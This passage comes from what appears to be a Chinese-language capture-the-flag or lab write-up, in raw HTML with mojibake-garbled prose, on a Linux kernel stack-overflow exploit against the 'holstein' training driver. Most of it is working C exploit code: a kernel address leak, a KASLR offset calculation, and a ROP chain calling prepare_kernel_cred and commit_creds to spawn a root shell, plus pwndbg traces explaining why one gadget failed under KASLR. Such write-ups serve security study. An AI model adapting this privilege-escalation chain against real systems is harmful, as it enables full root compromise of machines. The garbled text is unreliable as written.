class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x408</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] leak=0x%lx\n"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vfs_read+172</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">172</span><span class="token operator">-</span><span class="token number">0xffffffff8113d290</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff=0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="EXPé‡åˆ°çš„é—®é¢˜"><a href="#EXPé‡åˆ°çš„é—®é¢˜" class="headerlink" title="EXPé‡åˆ°çš„é—®é¢˜"></a>EXPé‡åˆ°çš„é—®é¢˜</h2><p>ç†è®ºä¸Šåº”è¯¥å¾ˆé¡ºåˆ©ï¼Œä½†æ˜¯åœ¨å…¶ä¸­é‡åˆ°äº†æŠ½è±¡é—®é¢˜ï¼š</p><ol><li>åœ¨å…³é—­kaslrçš„æƒ…å†µä¸‹expèƒ½å¤ŸæˆåŠŸï¼›ä½†æ˜¯å¦‚æœæ‰“å¼€kaslrï¼Œæˆ‘çš„expæœ‰è¾ƒå¤§æ¦‚ç‡å¯¼è‡´å†…æ ¸å´©æºƒï¼Œå°æ¦‚ç‡æˆåŠŸ</li><li>é€šè¿‡æ¯ä¸€æ¬¡æ‰“å°è®¡ç®—å‡ºçš„éšæœºåŒ–åçš„gadgetså’Œå‡½æ•°åœ°å€ï¼Œå¹¶å°†è¿™äº›åœ°å€ä¸gdbåŠ<code>/proc/kallsyms</code>ä¸­çš„åœ°å€åšæ¯”è¾ƒï¼Œæˆ‘å‘ç°è‡ªå·±çš„æ³„éœ²åŸºåœ°å€ã€è®¡ç®—gadgetså’Œå‡½æ•°åœ°å€çš„éƒ¨åˆ†æ²¡æœ‰é—®é¢˜ï¼Œå¾—å‡ºçš„åœ°å€æ˜¯æ­£ç¡®çš„ï¼›</li></ol><p>è€—äº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼Œå¾ˆæ˜¯è¿·æƒ‘ï¼Œæˆ‘å†³å®šæ‰“å¼€kaslræ¥è°ƒè¯•ä¸€ç•ªï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">pwndbg> stack 2000:0000â”‚ rsp 0xffffad21c0413eb0 â€”â–¸ 0xffffffffbce7bbdc â—‚â€” pop rdi /* 0x74d28548ccccc35f */01:0008â”‚     0xffffad21c0413eb8 â—‚â€” 002:0010â”‚     0xffffad21c0413ec0 â€”â–¸ 0xffffffffbcc6e240 â—‚â€” push rbp /* 0x894800000cc0be55 */03:0018â”‚     0xffffad21c0413ec8 â€”â–¸ 0xffffffffbceea083 â—‚â€” pop rcx /* 0x100ff81c3bd8359 */04:0020â”‚     0xffffad21c0413ed0 â—‚â€” 005:0028â”‚     0xffffad21c0413ed8 â€”â–¸ 0xffffffffbd20c96b â—‚â€” mov rdi, rax /* 0x66c3a548f3c78948 */06:0030â”‚     0xffffad21c0413ee0 â€”â–¸ 0xffffffffbcc6e390 â—‚â€” push rbp /* 0x4c655541e5894855 */07:0038â”‚     0xffffad21c0413ee8 â€”â–¸ 0xffffffffbd400e26 â—‚â€” mov rdi, rsp /* 0x25248b4865e78948 */08:0040â”‚     0xffffad21c0413ef0 â—‚â€” out dx, eax /* 0xdeadbeef */09:0048â”‚ r15 0xffffad21c0413ef8 â—‚â€” out dx, eax /* 0xdeadbeef */0a:0050â”‚     0xffffad21c0413f00 â€”â–¸ 0x4017e9 â—‚â€” endbr64  /* 0xe5894855fa1e0ff3 */0b:0058â”‚     0xffffad21c0413f08 â—‚â€” 0x33 /* '3' */0c:0060â”‚     0xffffad21c0413f10 â—‚â€” 0x2460d:0068â”‚     0xffffad21c0413f18 â€”â–¸ 0x7ffd0c83ea50 â—‚â€” 10e:0070â”‚     0xffffad21c0413f20 â—‚â€” 0x2b /* '+' */0f:0078â”‚     0xffffad21c0413f28 â—‚â€” 0... â†“        4 skipped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€å§‹çœ‹èµ·æ¥éå¸¸æ­£å¸¸ï¼Œä½†æ˜¯ç»§ç»­æ­¥è¿›åˆ°<code>pop rcx; ret;</code>æ—¶ï¼Œå‘ç°è¯¥gadgetçš„é€»è¾‘å‘ç”Ÿäº†å˜åŒ–ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text"> â–º 0xffffffffa8aea083    pop    rcx   0xffffffffa8aea084    test   eax, 0xff81c3   0xffffffffa8aea08a    add    dword ptr [rax], eax   0xffffffffa8aea08c    add    byte ptr [rcx], bl   0xffffffffa8aea08e    rol    byte ptr [rbx + 0x48c302c0], init_module+79 &lt;139>   0xffffffffa8aea095    push   rdi   0xffffffffa8aea096    or     byte ptr [rdi], cl   0xffffffffa8aea098    mov    dh, 2   0xffffffffa8aea09a    cmp    ax, init_module+31            &lt;91>   0xffffffffa8aea09e    jne    0xffffffffa8aea0a7            &lt;0xffffffffa8aea0a7>    â†“   0xffffffffa8aea0a7    ret   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[STACK]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ rsp 0xffffb9420044bed0 â—‚â€” 001:0008â”‚     0xffffb9420044bed8 â€”â–¸ 0xffffffffa8e0c96b â—‚â€” mov rdi, rax /* 0x66c3a548f3c78948 */02:0010â”‚     0xffffb9420044bee0 â€”â–¸ 0xffffffffa886e390 â—‚â€” push rbp /* 0x4c655541e5894855 */03:0018â”‚     0xffffb9420044bee8 â€”â–¸ 0xffffffffa9000e26 â—‚â€” mov rdi, rsp /* 0x25248b4865e78948 */04:0020â”‚     0xffffb9420044bef0 â—‚â€” out dx, eax /* 0xdeadbeef */05:0028â”‚ r15 0xffffb9420044bef8 â—‚â€” out dx, eax /* 0xdeadbeef */06:0030â”‚     0xffffb9420044bf00 â€”â–¸ 0x4017e9 â—‚â€” endbr64  /* 0xe5894855fa1e0ff3 */07:0038â”‚     0xffffb9420044bf08 â—‚â€” 0x33 /* '3' */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­£æ˜¯popå’Œretä¸­é—´æ’å…¥çš„åƒåœ¾æŒ‡ä»¤å¯¼è‡´äº†expæ‰§è¡Œå¤±è´¥ï¼Œè€Œä¸”æ¯æ¬¡æµ‹è¯•ä¼¼ä¹è¿™äº›åƒåœ¾æŒ‡ä»¤è¿˜ä¸ä¸€æ ·ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ç»ˆäºæŸ¥æ˜äº†expå¤±è´¥çš„ç›´æ¥åŸå› ï¼Œä½†ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå¯¼è‡´äº†æˆ‘çš„gadgetè¢«æ”¹å†™ã€‚æŒ‰ç†è¯´ï¼Œkaslråº”è¯¥åªæ˜¯åšå†…å­˜å¸ƒå±€çš„éšæœºåŒ–ï¼Œä¸åº”è¯¥ä¿®æ”¹å†…æ ¸å†…å®¹æ‰å¯¹ã€‚</p><p>è¿½æ ¹æº¯æºï¼Œç›´æ¥æ¥å®šä½<code>pop rcx; ret;</code>è¿™ä¸ªgadget(0xffffffff812ea083ï¼‰ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå†…æ ¸ä¸­è¯¥åœ°å€å¤„åŸæœ‰çš„ä¸¤æ¡æŒ‡ä»¤ï¼Œè€Œæ˜¯ä»ä¸€æ¡movæŒ‡ä»¤ä¸­çš„+12å¤„æˆªæ–­è§£æå‡ºçš„ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0xffffffff812ea080</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>mov    al<span class="token punctuation">,</span>BYTE PTR <span class="token punctuation">[</span>rdi<span class="token operator">-</span><span class="token number">0x7e3ca700</span><span class="token punctuation">]</span><span class="token comment">//æœºå™¨ç </span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span><span class="token number">6</span>xb <span class="token number">0xffffffff812ea080</span><span class="token number">0xffffffff812ea080</span> <span class="token operator">&lt;</span>acpi_ps_get_argument_count<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span><span class="token number">0x8a</span><span class="token number">0x87</span><span class="token number">0x00</span><span class="token number">0x59</span><span class="token number">0xc3</span><span class="token number">0x81</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªmovæŒ‡ä»¤ä¸­ä½¿ç”¨äº†ç»å¯¹åœ°å€<code>0xFFFFFFFF81C35900</code>ã€‚å¾ˆæ˜æ˜¾æ˜¯ropperå’ŒROPgadgetå°†<code>59 c3</code>è¯†åˆ«ä¸ºäº†<code>pop rcx;</code></p><p>åœ¨æ²¡æœ‰KASLRçš„æƒ…å†µä¸‹ï¼Œå®ƒç¡®å®æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„gadgetã€‚ç„¶è€Œï¼Œä¸€æ—¦KASLRç”Ÿæ•ˆï¼Œå®ƒåŒæ—¶ä¹Ÿå°†å†…æ ¸ä¸­è¿™äº›æ±‡ç¼–æŒ‡ä»¤ä¸­çš„ç»å¯¹åœ°å€ä¹Ÿåšäº†æ›´æ–°ï¼Œæ¯æ¬¡éšæœºåŒ–çš„ç»“æœä¸åŒä¹Ÿå°±å¯¼è‡´äº†æˆ‘æ¯æ¬¡çœ‹åˆ°çš„åƒåœ¾æŒ‡ä»¤ä¸ä¸€æ ·ï¼Œç”šè‡³å°éƒ¨åˆ†æƒ…å†µä¸‹åƒåœ¾æŒ‡ä»¤ä¸å½±å“åŸgadgetçš„åŠŸèƒ½ï¼Œæ•…è€Œæˆ‘çš„expèƒ½å¤ŸææƒæˆåŠŸã€‚</p><h2 id="æ­£ç¡®çš„EXP"><a href="#æ­£ç¡®çš„EXP" class="headerlink" title="æ­£ç¡®çš„EXP"></a>æ­£ç¡®çš„EXP</h2><p>æ›´æ¢rcxçš„gadgetä¸º<code>0xffffffff81466bd5: pop rcx; add cl, cl; ret;</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_ADD_AL_AL_RET</span> <span class="token expression"><span class="token number">0xffffffff81466bd5</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x408</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] leak=0x%lx\n"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vfs_read+172</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">172</span><span class="token operator">-</span><span class="token number">0xffffffff8113d290</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff=0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_ADD_AL_AL_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span 